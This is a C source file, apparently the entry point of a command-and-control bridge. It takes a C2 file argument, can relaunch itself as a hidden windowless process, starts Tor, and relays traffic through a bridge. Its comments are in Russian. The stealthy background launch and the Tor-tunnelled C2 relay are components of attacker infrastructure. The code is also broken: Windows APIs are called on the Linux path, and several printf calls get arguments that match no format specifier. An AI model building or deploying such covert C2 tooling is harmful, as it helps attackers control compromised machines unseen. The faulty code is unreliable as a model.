#define _GNU_SOURCE

#include <stdio.h>

#ifdef _WIN32
#include <windows.h>
#else // linux
#include <stddef.h>
#endif

#include "bridge.h"
#include "tor.h"
#include "args_parser.h"

int main(int argc, char *argv[]) {
    ProgramArgs args;

    if (parse_args(argc, argv, &args) != 0) {
        return 1;
    }

    if (args.daemon) {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
    
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;  // скрыть окно
    
        // Получаем имя текущего exe
        char exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);  // Путь к текущему exe

        char cmdLine[1024];
        sprintf(cmdLine, "\"%s\" --bridge-addr %s --bridge-port %d --tor-addr %s --tor-port %d -f %s",
                exePath, args.bridge_addr, args.bridge_port, args.tor_addr, args.tor_port, args.c2_file);

        // Запускаем новый процесс скрыто
        if (CreateProcess(
            exePath,        // имя exe
            cmdLine,        // параметры
            NULL,        // атрибуты процесса
            NULL,        // атрибуты потока
            FALSE,       // дескрипторы не наследуются
            CREATE_NO_WINDOW, // без окна
            NULL,        // окружение
            NULL,        // текущий каталог
            &si,         // информация запуска
            &pi))        // информация о процессе
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            printf("[*] Running app as daemom\n", argv[0]);

            return 0; // завершаем родительский процесс
        } else {
            printf("[!] Error running app as daemom: %d\n", argv[0], GetLastError());
            return 1;
        }
    }
    
    int tor_pid;
    tor_pid = start_tor(args.tor_addr, args.tor_port);
    if (tor_pid < 0) {
        printf("Failed start tor.\n");
        return -1;
    }

    init_bridge(args);

    Sleep(1000);

    if (stop_tor(tor_pid) == 0)
        printf("[*] Tor stopped.\n");

    fflush(stdout);

    return 0;
}
